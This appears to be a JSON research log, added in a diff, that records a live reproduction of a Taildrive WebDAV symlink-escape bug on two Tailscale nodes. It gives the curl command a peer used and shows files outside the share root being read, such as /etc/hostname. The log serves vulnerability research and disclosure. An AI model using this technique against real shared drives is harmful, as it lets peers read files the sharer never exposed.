@@ -1,0 +1,13 @@
+{
+  "title": "LIVE CONFIRMATION: Taildrive WebDAV symlink escape reproduced on real tailscaled across two nodes",
+  "date": "2026-10-25",
+  "setup": "Sharer = tkm (tailscale 1.104.1, this laptop); Reader = pi5 (Raspberry Pi 5, tailscale 1.102.2). Same tailnet tail7ebeb8.ts.net. Share 'poc' = /tmp/td-poc/share containing symlinks pointing OUTSIDE the share root.",
+  "reader_command": "on pi5: curl http://100.100.100.100:8080/tail7ebeb8.ts.net/tkm/poc/<path>",
+  "results": {
+    "normal.txt (control, inside share)": "normal file in share",
+    "link_to_secret -> /tmp/td-poc/secret/secret.txt (OUTSIDE share)": "SECRET-OUTSIDE-SHARE 1792939863 — ... the share boundary was escaped",
+    "link_to_etc_hostname -> /etc/hostname (OUTSIDE share)": "tkm (the sharer node's /etc/hostname)"
+  },
+  "conclusion": "A tailnet peer granted Taildrive access read files outside the shared directory root via symlinks inside the share. End-to-end confirmation of the webdav.Dir symlink-follow finding (ev10) on real tailscaled, not just the library-level PoC.",
+  "notes": "AllowedIPs/permission model otherwise intact; read performed as the sharing user (tkmremi). Matches the source-traced path peerapi /v0/drive -> webdav.Dir.OpenFile."
+}
